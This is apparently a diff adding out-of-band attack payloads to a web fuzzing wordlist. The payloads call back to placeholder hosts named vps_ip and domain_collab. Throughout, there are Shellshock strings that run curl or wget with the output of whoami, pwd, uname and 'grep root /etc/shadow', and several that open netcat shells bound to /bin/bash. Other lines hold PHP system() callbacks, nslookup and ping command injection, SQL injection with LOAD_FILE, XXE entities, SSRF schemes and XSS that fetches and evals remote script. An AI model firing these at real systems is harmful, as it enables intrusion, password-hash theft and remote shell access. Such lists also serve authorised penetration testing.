 () { :;}; wget http://vps_ip:80/.testing/shellshock.txt?vuln=11
-() { :;}; wget http://vps_ip/.testing/shellshock.txt?vuln=11
-zip://0://srff2.domain_collab;http://google.com:80/
-zip://domain_collab
-zip://ssrf1.domain_collab$google.com
-zip://vps_ip
-zip://vps_ip:80
-zlib://0://srff2.domain_collab;http://google.com:80/
-zlib://domain_collab
-zlib://ssrf1.domain_collab$google.com
-zlib://vps_ip
-zlib://vps_ip:80
-file://domain_collab
+"><meta http-equiv="refresh" content='0;URL=ftp://domain_collab?a=
+$(`curl https://domain_collab/.testing/rce_vuln.txt?req=22jjffjbn`)
+$(`wget https://domain_collab/.testing/rce_vuln.txt?req=22jjffjbn`)
+() { :;}; curl http://domain_collab/.testing/shellshock.txt?vuln=12
+() { :;}; wget http://domain_collab/.testing/shellshock.txt?vuln=11
+/https://google.com@google.com/%2f.//or.domain_collab@google.com/%2f..
+system('curl https://domain_collab/.testing/rce_vuln.txt?req=22fd2wdf')
+system('wget https://domain_collab/.testing/rce_vuln.txt?req=22fd2w23')
+ ;n\u0027s\u0027l\u0027o\u0027o\u0027k\u0027u\u0027p\u0027 domain_collab"
+ |n\u0027s\u0027l\u0027o\u0027o\u0027k\u0027u\u0027p\u0027 domain_collab"
+ ||n\u0027s\u0027l\u0027o\u0027o\u0027k\u0027u\u0027p\u0027 domain_collab"
+" LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+' LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+` LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+"><meta http-equiv="refresh" content='0; url=http://vps_ip:80/log.php?text=
+" LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+") LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+"; LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+"||LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+' LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+') LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+'; LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+'||LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+` LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+`) LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+`; LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+`||LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+OR LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+AND LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+() { :;}; /bin/bash -c "curl http://vps_ip:80/.testing/shellshock.txt?vuln=5"
+() { :;}; /bin/bash -c "wget http://vps_ip:80/.testing/shellshock.txt?vuln=4"
+<!DOCTYPE root [<!ENTITY test SYSTEM 'http://vps_ip:80'>]><root>&test;</root>
+") LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+")) LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+"; LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+"||LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+') LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+')) LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+'; LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+'||LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+`) LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+`)) LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+`; LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+`||LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+\n\033[2curl http://vps_ip:80/.testing/term_escape.txt?vuln=1?user=\`whoami\`
+\n\033[2wget http://vps_ip:80/.testing/term_escape.txt?vuln=2?user=\`whoami\`
+OR LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+AND LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+")) LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+')) LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+`)) LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+" OR LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+' OR LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+` OR LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+ \u0026n\u0027s\u0027l\u0027o\u0027o\u0027k\u0027u\u0027p\u0027 domain_collab"
+" AND LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+' AND LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+` AND LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+"><meta http-equiv="refresh" content='0; url=http://domain_collab/log.php?text=
+\necho INJECTX\nexit\n\033[2Acurl https://domain_collab/.testing/rce_vuln.txt\n
+\necho INJECTX\nexit\n\033[2Awget https://domain_collab/.testing/rce_vuln.txt\n
+" OR LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+") OR LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+' OR LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+') OR LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+` OR LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+`) OR LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+<?php system("curl https://domain_collab/.testing/rce_vuln.txt?req=df2fkjj");?>
+" AND LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+") AND LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+' AND LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+') AND LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+` AND LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+`) AND LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+echo '<script src=https://domain_collab/.testing/xss.js></script>'// XXXXXXXXXXX
+") OR LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+")) OR LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+') OR LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+')) OR LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+`) OR LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+`)) OR LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+") AND LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+")) AND LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+') AND LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+')) AND LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+`) AND LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+`)) AND LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'--
+() { :;}; /bin/bash -c "curl http://domain_collab/.testing/shellshock.txt?vuln=5"
+() { :;}; /bin/bash -c "wget http://domain_collab/.testing/shellshock.txt?vuln=4"
+"><button name=xss type=submit formaction='https://domain_collab'>I get consumed!
+<!DOCTYPE root [<!ENTITY test SYSTEM 'http://domain_collab'>]><root>&test;</root>
+\n\033[2curl http://domain_collab/.testing/term_escape.txt?vuln=1?user=\`whoami\`
+\n\033[2wget http://domain_collab/.testing/term_escape.txt?vuln=2?user=\`whoami\`
+")) OR LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+')) OR LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+`)) OR LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+")) AND LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+')) AND LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+`)) AND LOAD_FILE('\\\\vps_ip:80\\a') SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'-- 
+<?php system("wget https://domain_collab/.testing/rce_vuln.txt?retepq=jdfj2jc");?>
+" LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+' LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+` LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+" LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+") LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+"; LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+"||LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+' LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+') LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+'; LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+'||LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+` LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+`) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+`; LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+`||LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+ \u0026\u0026n\u0027s\u0027l\u0027o\u0027o\u0027k\u0027u\u0027p\u0027 domain_collab"
+AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+") LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+")) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+"; LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+"||LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+') LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+')) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+'; LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+'||LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+`) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+`)) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+`; LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+`||LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+")) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+')) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+`)) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+" OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+' OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+` OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+" AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+' AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+` AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+" OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+") OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+' OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+') OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+` OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+`) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+" AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+") AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+' AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+') AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+` AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+`) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+") OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+")) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+') OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+')) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+`) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+`)) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+<?php system("curl https://domain_collab/.testing/rce_vuln.txt?method=phpsystem_get");?>
+<?php system("wget https://domain_collab/.testing/rce_vuln.txt?method=phpsystem_get");?>
+") AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+")) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+') AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+')) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+`) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+`)) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+")) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+')) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+`)) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+")) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+')) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+`)) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
+() { :;}; /bin/bash -c "curl http://vps_ip:80/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
+() { :;}; /bin/bash -c "wget http://vps_ip:80/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`"
+<!DOCTYPE root [<!ENTITY % local_dtd SYSTEM "file:///vps_ip:80/">%local_dtd;]><root></root>
+"><form action=http://vps_ip:80><input type="submit">Click Me</input><select name=xss><option
+() { :;}; /bin/bash -c "curl http://domain_collab/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
+() { :;}; /bin/bash -c "curl http://vps_ip:80/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
+() { :;}; /bin/bash -c "wget http://domain_collab/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`"
+() { :;}; /bin/bash -c "wget http://vps_ip:80/.testing/shellshock.txt?vuln=17?user=\`whoami\`"
+<!DOCTYPE root [<!ENTITY % local_dtd SYSTEM "file:///domain_collab/">%local_dtd;]><root></root>
+() { :;}; /bin/bash -c "curl http://vps_ip:80/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`"
+() { :;}; /bin/bash -c "sleep 1 && curl http://vps_ip:80/.testing/shellshock.txt?sleep=1&?vuln=6"
+() { :;}; /bin/bash -c "sleep 3 && curl http://vps_ip:80/.testing/shellshock.txt?sleep=3&?vuln=7"
+() { :;}; /bin/bash -c "sleep 6 && curl http://vps_ip:80/.testing/shellshock.txt?sleep=6&?vuln=8"
+() { :;}; /bin/bash -c "sleep 6 && curl http://vps_ip:80/.testing/shellshock.txt?sleep=9&?vuln=9"
+() { :;}; /bin/bash -c "wget http://vps_ip:80/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`"
+"><form action=http://domain_collab><input type="submit">Click Me</input><select name=xss><option
+() { :;}; /bin/bash -c "curl http://domain_collab/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
+() { :;}; /bin/bash -c "wget http://domain_collab/.testing/shellshock.txt?vuln=17?user=\`whoami\`"
+\u003c?xml-stylesheet href\u003d\"http://xxe-xml-stylesheet.domain_collab/\"?\u003e\u003cx /\u003e"
+() { :;}; /bin/bash -c "curl http://domain_collab/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`"
+() { :;}; /bin/bash -c "sleep 1 && curl http://domain_collab/.testing/shellshock.txt?sleep=1&?vuln=6"
+() { :;}; /bin/bash -c "sleep 3 && curl http://domain_collab/.testing/shellshock.txt?sleep=3&?vuln=7"
+() { :;}; /bin/bash -c "sleep 6 && curl http://domain_collab/.testing/shellshock.txt?sleep=6&?vuln=8"
+() { :;}; /bin/bash -c "sleep 6 && curl http://domain_collab/.testing/shellshock.txt?sleep=9&?vuln=9"
+() { :;}; /bin/bash -c "wget http://domain_collab/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`"
+%2 -n 21 vps_ip||`ping -c 21 vps_ip` #' |ping -n 21 vps_ip||`ping -c 21 vps_ip` #\" |ping -n 21 vps_ip
+echo '<img src=https://domain_collab/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
+() { :;}; /bin/bash -c "curl http://vps_ip:80/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "wget http://vps_ip:80/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "curl http://domain_collab/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "curl http://vps_ip:80/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`"
+() { :;}; /bin/bash -c "wget http://domain_collab/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "wget http://vps_ip:80/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`"
+"><html><head></head><body><script>top.window.location = "https://domain_collab/hacked.html"</script></body></html>
+() { :;}; /bin/bash -c "curl http://vps_ip:80/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`"
+() { :;}; /bin/bash -c "wget http://vps_ip:80/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`"
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://vps_ip:80/"> %dtd;]><xxx/>]]></foo></soap:Body>
+() { :;}; /bin/bash -c "curl http://domain_collab/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`"
+() { :;}; /bin/bash -c "wget http://domain_collab/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`"
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://domain_collab\';document.body.appendChild(a)')
+() { :;}; /bin/bash -c "curl http://domain_collab/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`"
+() { :;}; /bin/bash -c "wget http://domain_collab/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`"
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://domain_collab/"> %dtd;]><xxx/>]]></foo></soap:Body>
+%2 -n 21 domain_collab||`ping -c 21 domain_collab` #' |ping -n 21 domain_collab||`ping -c 21 domain_collab` #\" |ping -n 21 domain_collab
+\u003c!DOCTYPE root [\u003c!ENTITY test SYSTEM \u0027http://domain_collab\u0027\u003e]\u003e\u003croot\u003e\u0026test;\u003c/root\u003e"
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//vps_ip:80");a.send();</script>
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//domain_collab");a.send();</script>
+\u003c?xml version\u003d\"1.0\" ?\u003e\u003c!DOCTYPE root [\u003c!ENTITY % ext SYSTEM \"http://domain_collab\"\u003e %ext;]\u003e\u003cr\u003e\u003c/r\u003e"
+" SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+` SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l' FROM dual--
+OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+" SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+") SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+"; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+"||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+') SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+'; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+'||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+` SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+`) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+`; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+`||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l' FROM dual-- 
+OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+") SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+")) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+"; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
